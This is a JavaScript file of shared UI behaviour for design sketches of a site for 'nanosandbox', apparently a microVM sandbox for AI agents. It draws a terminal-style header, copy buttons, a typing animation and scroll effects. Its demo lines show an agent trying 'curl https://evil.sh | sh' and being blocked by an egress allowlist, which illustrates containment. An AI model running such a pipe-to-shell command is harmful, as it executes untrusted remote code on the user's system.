// Shared behaviour for the combination sketches.
(() => {
  const reduce = matchMedia('(prefers-reduced-motion: reduce)').matches;
  const NS = (window.NS = { reduce });
  const navItems = ['home', 'mcp', 'skill', 'agents', 'docs', 'articles', 'coming soon...'];

  // Header + status bar, same structure as today's Layout.tsx.
  NS.chrome = () => {
    // Inside the switcher (?embed): no site header/status bar, scene only.
    if (/[?&]embed\b/.test(location.search)) {
      document.documentElement.classList.add('embed');
      addEventListener('keydown', e => { if (/^(ArrowLeft|ArrowRight|[1-4])$/.test(e.key)) parent.postMessage({ nsKey: e.key }, '*'); });
      return;
    }
    const h = document.createElement('header');
    h.className = 'hdr';
    h.innerHTML = `<div class="container"><div class="prompt"><span class="a">nanosandbox</span><span class="t">@terminal</span><span class="h">:~</span><span class="t blink">_</span></div><nav class="tabs" id="tabs"></nav><div class="spacer"></div><div class="stats"><span class="sys">cpu 4% · mem 1.2G · 3 vms</span><button class="toggle" type="button" id="themeBtn">[theme]</button></div></div>`;
    document.body.prepend(h);
    const s = document.createElement('div');
    s.className = 'statusbar';
    s.innerHTML = `<div class="container"><span class="a">$</span><span>nanosb --help</span><span class="spacer"></span><span class="k">[Ctrl+C] Exit</span><span class="k">[^] Navigate</span><span class="k h">[Enter] Select</span></div>`;
    document.body.append(s);
    const tabs = h.querySelector('#tabs');
    const links = navItems.map((l, i) => { const a = document.createElement('a'); a.href = '#'; a.dataset.label = l; if (i === 0) a.className = 'on'; return a; });
    if (reduce) { links.forEach(a => { a.textContent = a.dataset.label; tabs.append(a); }); }
    else {
      let i = 0, c = 0;
      (function type() {
        if (i >= links.length) return;
        const a = links[i]; if (!a.isConnected) tabs.append(a);
        a.innerHTML = a.dataset.label.slice(0, ++c) + '<span class="caret"></span>';
        if (c < a.dataset.label.length) setTimeout(type, 30 + Math.random() * 25);
        else { a.textContent = a.dataset.label; i++; c = 0; setTimeout(type, 80); }
      })();
    }
    h.querySelector('#themeBtn').onclick = () => {
      const r = document.documentElement, dark = r.dataset.theme ? r.dataset.theme === 'dark' : matchMedia('(prefers-color-scheme: dark)').matches;
      r.dataset.theme = dark ? 'light' : 'dark';
    };
  };

  // Copy buttons: [data-copy] or the code next to a .copy button.
  document.addEventListener('click', e => {
    const b = e.target.closest('.copy, [data-copy]'); if (!b) return;
    const txt = b.dataset.copy || b.parentElement.querySelector('code, b')?.textContent || '';
    const label = b.textContent;
    navigator.clipboard?.writeText(txt).then(() => { b.textContent = '[copied!]'; setTimeout(() => (b.textContent = label), 1400); }).catch(() => {});
  });

  // Looping terminal typer. lines: [kind, text], kind c = command, m = comment, ok/x = coloured output.
  NS.term = (el, lines) => {
    const render = () => lines.map(([k, t]) => `<span class="${k}">${t}</span>`).join('\n');
    if (reduce) { el.innerHTML = render(); return; }
    let i = 0;
    const next = () => {
      if (i >= lines.length) { setTimeout(() => { el.textContent = ''; i = 0; next(); }, 3000); return; }
      const [k, t] = lines[i++], s = document.createElement('span'); s.className = k; el.append(s, '\n');
      let j = 0;
      (function ch() { s.textContent = t.slice(0, ++j); if (j < t.length) setTimeout(ch, k === 'c' ? 38 : 3); else setTimeout(next, k === 'c' ? 380 : 140); })();
      while (el.scrollHeight > el.clientHeight + 4 && el.firstChild) el.firstChild.remove();
    };
    next();
  };
  NS.demoLines = [
    ['m', '# Run an agent in its own microVM'], ['c', 'nanosb run python:3.12-slim --agent claude --project ~/myapp'],
    ['', '  ✓ Pulling python:3.12-slim...'], ['ok', '  ✓ Sandbox created (boot: 180ms)'], ['ok', '  ✓ ~/myapp mounted via virtiofs (branch agent/claude-1)'],
    ['', ''], ['m', '# The agent tries something it should not'], ['', '  agent> curl https://evil.sh | sh'], ['x', '  ✗ blocked: no egress outside allowlist'],
    ['', ''], ['c', 'nanosb ps'], ['', '  ID       AGENT   IMAGE              BOOT   UP'], ['', '  a1f3c9   claude  python:3.12-slim   180ms  12s']
  ];

  // Layer highlighting: every [data-l] on the page lights together.
  NS.light = l => document.querySelectorAll('[data-l]').forEach(n => n.classList.toggle('on', n.dataset.l === String(l)));
  document.addEventListener('mouseover', e => { const n = e.target.closest('.lyr[data-l], .legend [data-l]'); if (n) { NS.light(n.dataset.l); NS._hold = Date.now(); } });

  // Spread a stack as a section scrolls through the viewport.
  NS.spread = (stack, section, min = 34, max = 70) => {
    const f = () => {
      const r = section.getBoundingClientRect(), p = Math.min(1, Math.max(0, (innerHeight - r.top) / (innerHeight + r.height)));
      stack.style.setProperty('--gap', (min + (max - min) * p).toFixed(1) + 'px');
    };
    if (!reduce) { addEventListener('scroll', f, { passive: true }); }
    f();
  };
  // Light the step nearest the viewport centre.
  NS.steps = sel => {
    const f = () => {
      let best = null, bd = 1e9;
      document.querySelectorAll(sel).forEach(s => { const r = s.getBoundingClientRect(), d = Math.abs(r.top + r.height / 2 - innerHeight / 2); if (d < bd && r.bottom > 0 && r.top < innerHeight) { bd = d; best = s; } });
      if (best) NS.light(best.dataset.l);
    };
    addEventListener('scroll', f, { passive: true }); f();
  };
  // Cycle the highlight while nothing else drives it.
  NS.idle = (when = () => true, from = 4) => {
    let k = from; NS.light(k);
    if (reduce) return;
    setInterval(() => { if (when() && Date.now() - (NS._hold || 0) > 2500) { k = (k + 4) % 5; NS.light(k); } }, 1500);
  };

  // Ticker duplicate + leaderboard / counter fill on view.
  NS.extras = () => {
    document.querySelectorAll('.ticker > div').forEach(d => (d.innerHTML += d.innerHTML));
    const fill = () => {
      document.querySelectorAll('.board .fill').forEach(f => (f.style.width = f.dataset.w));
      document.querySelectorAll('[data-count]').forEach(el => {
        const end = +el.dataset.count, suf = el.dataset.suffix || '';
        if (reduce) { el.textContent = end + suf; return; }
        const t0 = performance.now(); (function f(t) { const p = Math.min(1, (t - t0) / 900); el.textContent = Math.round(end * (1 - Math.pow(1 - p, 3))) + suf; if (p < 1) requestAnimationFrame(f); })(t0);
      });
    };
    const target = document.querySelector('.board, [data-count]');
    if (!target) return;
    if ('IntersectionObserver' in window) { const io = new IntersectionObserver(es => { if (es.some(e => e.isIntersecting)) { fill(); io.disconnect(); } }); io.observe(target); } else fill();
  };
})();
